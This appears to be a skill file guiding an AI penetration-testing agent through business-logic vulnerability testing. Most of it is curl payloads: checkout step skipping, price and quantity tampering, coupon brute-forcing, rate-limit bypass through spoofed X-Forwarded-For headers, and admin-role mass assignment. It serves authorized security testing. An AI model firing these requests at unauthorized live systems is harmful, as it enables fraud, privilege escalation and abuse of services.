---
name: business-logic-testing
description: Business logic vulnerability detection — workflow bypass, price manipulation, state abuse, and application-specific flaws
origin: AI Threat Hunting
---

# Business Logic Testing

## When to Activate

- Application has multi-step workflows (checkout, registration, KYC, approval)
- Financial operations exist (payments, transfers, balance, discounts, coupons)
- Role-based access with state transitions (pending → approved → completed)
- Any feature where the intended sequence of operations matters
- Application trusts client-side values for server-side decisions

## Tools

- `curl` — craft requests with manipulated parameters
- `ffuf` — fuzz parameter values for boundary conditions
- Browser DevTools — observe workflow state and hidden parameters

For live engagement target requests, execute `curl` through the Kali MCP
command-execution tool. Add explicit `-b` or `-H "Authorization: ..."` only
when intentionally testing alternate identities, broken session handling, or
auth override behavior.

## Methodology

### 1. Workflow Bypass

Test if steps in multi-step processes can be skipped:

```bash
# Identify all steps in a workflow (e.g., checkout)
# Step 1: /cart → Step 2: /shipping → Step 3: /payment → Step 4: /confirm

# Skip directly to final step
curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123"}'

# Skip payment step — go from shipping to confirm
curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123","shippingId":"456"}'

# Repeat a step that should only execute once (e.g., apply coupon)
curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}'
# Apply same coupon again
curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}'
```

### 2. Price / Value Manipulation

Test if financial values can be tampered:

```bash
# Negative quantity
curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":-5,"price":100}'

# Zero price
curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":1,"price":0}'

# Fractional values where integer expected
curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":0.001}'

# Overflow: extremely large values
curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":99999999999999}'

# Modify price in request (if client sends price)
# Compare: does server validate price matches catalog?
curl -s -X POST "http://target/api/order/create" \
  -d '{"productId":"1","quantity":1,"price":0.01}'

# Currency confusion — send different currency code
curl -s -X POST "http://target/api/payment" \
  -d '{"amount":100,"currency":"JPY"}'
```

### 3. State Abuse / Transition Bypass

Test if state transitions can be manipulated:

```bash
# Modify status directly
curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"completed"}'

# Cancel after completion
curl -s -X POST "http://target/api/order/123/cancel"

# Re-open closed ticket/order
curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"pending"}'

# Access resources in wrong state
# e.g., download invoice before payment
curl -s "http://target/api/order/123/invoice"

# Modify data after approval
curl -s -X PUT "http://target/api/application/123" \
  -d '{"amount":999999}'
```

### 4. Rate Limit / Abuse Prevention Bypass

```bash
# Brute force with no rate limit
for i in $(seq 1 100); do
  curl -s -X POST "http://target/api/coupon/redeem" \
    -d "{\"code\":\"GUESS$i\"}" -o /dev/null -w "%{http_code}\n"
done

# Bypass rate limit via IP rotation headers
curl -s -X POST "http://target/api/login" \
  -H "X-Forwarded-For: 1.2.3.$((RANDOM % 255))" \
  -d '{"user":"admin","pass":"test"}'

# Bypass via case variation
curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50"}'
curl -s "http://target/api/coupon/apply" -d '{"code":"discount50"}'
curl -s "http://target/api/coupon/apply" -d '{"code":"Discount50"}'
```

### 5. Feature Abuse

```bash
# Email/notification abuse — trigger mass emails
curl -s -X POST "http://target/api/invite" \
  -d '{"emails":["a@x.com","b@x.com","c@x.com",...1000 emails]}'

# Referral abuse — refer yourself
curl -s -X POST "http://target/api/referral" \
  -d '{"referralCode":"MY_CODE"}' -b "session=TOKEN_DIFFERENT_ACCOUNT"

# Gift card / point manipulation
# Buy gift card with gift card balance
curl -s -X POST "http://target/api/purchase" \
  -d '{"product":"gift_card","paymentMethod":"gift_card_balance"}'

# Time-based abuse — use expired offer
curl -s -X POST "http://target/api/offer/apply" \
  -d '{"offerId":"expired_offer_123"}'

# Privilege escalation via profile update
curl -s -X PUT "http://target/api/user/profile" \
  -d '{"role":"admin","isAdmin":true,"userType":"staff"}'
```

### 6. Input Validation Logic Flaws

```bash
# Type confusion — string where number expected
curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":"abc","to":"user2"}'

# Boolean confusion
curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":"true"}' # string vs boolean
curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":1}' # number vs boolean

# Array where single value expected
curl -s -X POST "http://target/api/user/update" \
  -d '{"email":["admin@target.example","attacker@evil.example"]}'

# Null / undefined injection
curl -s -X POST "http://target/api/payment" \
  -d '{"amount":null}'
curl -s -X POST "http://target/api/payment" \
  -d '{}'
```

## What to Record

- **Workflow step** that was bypassed or abused
- **Expected behavior** vs **actual behavior**
- **Financial impact** if applicable (e.g., "purchased item for $0")
- **Exact request/response** proving the logic flaw
- **Reproducibility** — can it be repeated?
- **Severity** — based on business impact, not just technical impact:
  - HIGH: financial loss, unauthorized transactions, data manipulation
  - MEDIUM: workflow bypass, feature abuse, state corruption
  - LOW: minor logic inconsistency, informational leak via logic

## Extended Resources

- `agent/references/payloads/business-logic-payloads.md` — negative quantity, coupon abuse, payment bypass, mass assignment
- `agent/references/vuln-checklists/A06-insecure-design.md` — OWASP Top 10:2025 insecure design checklist
